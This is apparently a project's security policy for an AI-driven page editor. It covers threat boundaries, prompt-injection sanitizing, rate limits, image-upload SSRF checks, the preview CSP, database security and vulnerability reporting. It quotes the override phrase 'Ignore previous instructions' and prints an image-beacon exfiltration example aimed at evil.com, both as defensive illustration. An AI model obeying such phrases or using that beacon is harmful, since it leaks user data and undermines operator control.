# Security

This document outlines security boundaries, threat mitigations, and best practices for
the AI Editor and related features.

## Threat Model Overview

### Trust Boundaries

1. **Trusted Input**
   - AI-generated HTML from our Claude models
   - Server-side data from authenticated Supabase queries
   - Environment variables and configuration

2. **Untrusted Input**
   - User messages in the chat interface
   - User-uploaded images
   - URL parameters and request bodies
   - Conversation history (may have been tampered client-side)

## Prompt Injection Mitigation

### How We Protect Against Prompt Injection

User content that could influence AI behavior is sanitized before being sent to Claude:

1. **Bracketed Role Markers**: `[system]` and `[assistant]` tags are replaced with
   `[user_input]` to prevent role impersonation

2. **Directive Headers**: Standalone headers like `## System` or `## Instructions` are
   sanitized, while natural phrases like "## System Requirements" pass through

3. **Instruction Override Patterns**: Commands like "Ignore previous instructions." at
   sentence boundaries are filtered

### Design Philosophy

- **Minimize False Positives**: We err toward allowing legitimate content rather than
  over-filtering
- **Context-Aware**: Patterns are checked in context (e.g., sentence boundaries) not
  blindly matched
- **Fail Safe**: When uncertain, content passes through (handled by AI model's
  instruction-following)

See `lib/ai/sanitize.ts` for implementation details.

## Rate Limiting

### Protected Endpoints

Rate limiting prevents abuse of expensive operations:

| Endpoint                          | Limit | Window   | Rationale          |
| --------------------------------- | ----- | -------- | ------------------ |
| `/api/funnel-map/chat`            | 150   | 1 hour   | AI conversations   |
| `/api/funnel-map/generate-drafts` | 10    | 1 hour   | Parallel AI calls  |
| `/api/ai-editor/chat`             | 150   | 1 hour   | AI conversations   |
| `/api/pages/upload-image`         | 30    | 1 minute | Storage operations |

### Rate Limit Headers

Rate-limited endpoints return headers on both success and 429 responses:

- `X-RateLimit-Limit`: Maximum requests allowed
- `X-RateLimit-Remaining`: Requests remaining
- `X-RateLimit-Reset`: ISO timestamp when limit resets

## Image Upload Security

### URL Validation

Image URLs are validated before fetching:

- Only URLs from our Supabase project origin are allowed
- Data URLs (`data:image/...`) are permitted for inline content
- Origin checking uses exact match, not substring, to prevent SSRF via lookalike domains

### Size Limits

- **Maximum image size**: 5MB
- **Timeout**: 10 seconds for fetch operations
- Content-Length header is checked before download
- Actual size is verified after download (headers can lie)

## Content Security Policy (CSP)

### Preview Iframe CSP

The AI editor preview uses a sandboxed iframe with CSP:

```
default-src 'self' data: blob:;
script-src 'unsafe-inline';
style-src 'unsafe-inline' https://fonts.googleapis.com;
font-src https://fonts.gstatic.com;
img-src * data: blob:;
connect-src 'none';
frame-ancestors 'none';
```

### Trade-offs

- **`script-src 'unsafe-inline'`**: Required for AI-generated interactive elements.
  Mitigated by sandbox isolation and trusted content source.
- **`connect-src 'none'`**: Blocks all network requests from preview, preventing data
  exfiltration via fetch/XHR.
- **`img-src *`**: Allows images from any source for user content flexibility.

### Residual Risks

Image-based exfiltration (e.g., `new Image().src = 'https://evil.com/?data=...'`)
remains theoretically possible but is mitigated by:

1. AI content is generated by our trusted model
2. Preview runs in sandboxed iframe with restricted capabilities
3. Production pages can use stricter CSP as needed

## Input Size Limits

### HTML Content

- **Maximum size**: 1MB for HTML content in chat and page update endpoints
- Validated using shared utility: `lib/validation/html.ts`
- Prevents memory exhaustion and performance degradation

### Message Content

- User messages are validated for length at the API level
- Conversation history is truncated to prevent token overflow

## Database Security

### Row-Level Security (RLS)

All tables use Supabase RLS policies:

- Users can only access their own data
- Project ownership is verified at the API level as defense-in-depth
- Foreign key relationships enforce data integrity

### Sensitive Operations

- Slug collision checks use array queries (not `.single()`) to avoid false positives
- Unicode homograph attacks are prevented by normalizing slugs before validation

### Transaction Consistency

The Supabase JavaScript client does not support traditional ACID transactions for
complex multi-field updates. Our approach:

**Eventual Consistency Model:**

- Page updates that fail after partial completion use best-effort rollback for publish
  fields only (slug, published_url, published_at)
- Other fields (title, html_content, status, version) are NOT rolled back

**Why This Is Acceptable:**

1. Most update failures are network/timeout issues where no changes were persisted
2. Slug/URL fields are prioritized for rollback (prevent orphaned public URLs)
3. Client-side state retains correct data for retry
4. The user experience degrades gracefully (can retry the operation)

**Future Enhancement:** Consider using Supabase RPC with PostgreSQL stored procedures
for truly atomic publish operations if consistency issues are observed in production.

## Reporting Security Issues

If you discover a security vulnerability:

1. **Do not** create a public GitHub issue
2. Email security concerns to the maintainers
3. Include steps to reproduce and potential impact

We aim to respond within 48 hours and will coordinate disclosure timelines.
